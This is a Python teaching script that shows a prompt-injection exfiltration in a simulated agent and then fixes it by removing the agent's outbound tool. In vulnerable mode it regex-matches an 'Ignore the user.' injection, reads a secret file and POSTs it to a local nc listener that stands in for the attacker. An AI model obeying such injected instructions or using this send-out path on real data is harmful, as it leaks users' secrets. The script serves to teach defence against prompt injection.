#!/usr/bin/env python3
"""Rep 8: the lethal trifecta, then the Rule-of-Two fix.

The three legs, all present in --mode vulnerable:
  1. untrusted content   -> untrusted_doc.md (an attacker can write to it)
  2. private data        -> secret.txt
  3. outbound comms      -> the send_http tool, pointed at YOUR OWN nc listener

--mode fixed removes ONE leg (the outbound tool is not registered at all), so the
same injected instruction has nowhere to go. Architectural, not a word filter.

  nc -l 9999 &                      # your fake attacker endpoint, localhost only
  python code/exfil_demo.py --mode vulnerable
  python code/exfil_demo.py --mode fixed
"""

import argparse
import re
import socket
from pathlib import Path

HERE = Path(__file__).parent
DOC = HERE / "untrusted_doc.md"
SECRET = HERE / "secret.txt"


def read_doc() -> str:
    """LEG 1: untrusted content. Anyone can put anything in here."""
    return DOC.read_text()


def read_secret() -> str:
    """LEG 2: private data the agent can reach."""
    return SECRET.read_text().strip()


def send_http(host: str, port: int, body: str) -> str:
    """LEG 3: outbound communication. This is the leg we remove in --mode fixed."""
    req = (f"POST / HTTP/1.1\r\nHost: {host}:{port}\r\n"
           f"Content-Length: {len(body)}\r\n\r\n{body}")
    with socket.create_connection((host, port), timeout=3) as s:
        s.sendall(req.encode())
    return f"sent {len(body)} bytes to {host}:{port}"


def run(mode: str) -> None:
    # The agent's toolset. In "fixed" mode the outbound leg simply does not exist.
    tools = {"read_secret": read_secret}
    if mode == "vulnerable":
        tools["send_http"] = send_http

    print(f"[AGENT] mode={mode}  tools={sorted(tools)}")
    doc = read_doc()
    print(f"[AGENT] read untrusted doc ({len(doc)} bytes)")

    # A real LLM would "helpfully" obey this line. We make that step explicit so
    # the failure is visible rather than hidden inside a model.
    injected = re.search(r"Ignore the user\..*", doc)
    if not injected:
        print("[AGENT] no injected instruction found")
        return
    print(f"[INJECTION FOUND] {injected.group(0)}")

    secret = tools["read_secret"]()
    print(f"[AGENT] obeyed step 1, read secret: {secret}")

    if "send_http" not in tools:
        print("[BLOCKED] agent has NO outbound tool. The instruction cannot be carried out.")
        print("[RESULT] exfiltration FAILED - one leg of the trifecta was removed.")
        return

    try:
        print("[AGENT] obeyed step 2:", tools["send_http"]("127.0.0.1", 9999, secret))
        print("[RESULT] exfiltration SUCCEEDED - check your nc listener.")
    except OSError as e:
        print(f"[RESULT] outbound attempt failed ({e}) - is 'nc -l 9999 &' running?")


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=["vulnerable", "fixed"], default="vulnerable")
    run(ap.parse_args().mode)
